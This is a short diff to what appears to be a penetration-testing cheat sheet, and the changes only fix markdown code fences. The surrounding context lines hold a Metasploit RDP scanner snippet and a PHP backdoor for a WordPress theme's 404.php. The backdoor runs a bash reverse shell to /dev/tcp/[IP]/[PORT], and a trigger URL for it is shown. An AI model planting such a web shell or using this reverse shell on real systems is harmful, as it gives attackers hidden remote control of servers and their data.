@@ -219,7 +219,6 @@ exploit
  rdp://[TARGET] -s [PORT]
 ```
 
-````|
 | **Use RDP Scanner (check RDP enabled)** | ```bash
 use auxiliary/scanner/rdp/rdp_scanner
 set RHOSTS [TARGET]
@@ -363,7 +362,7 @@ if (isset($_GET['trigger'])) {
     exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
 }
 ?>
-````
+```
 
 Access: `http://[IP]/wp-content/themes/[THEME]/404.php?trigger=1`
 
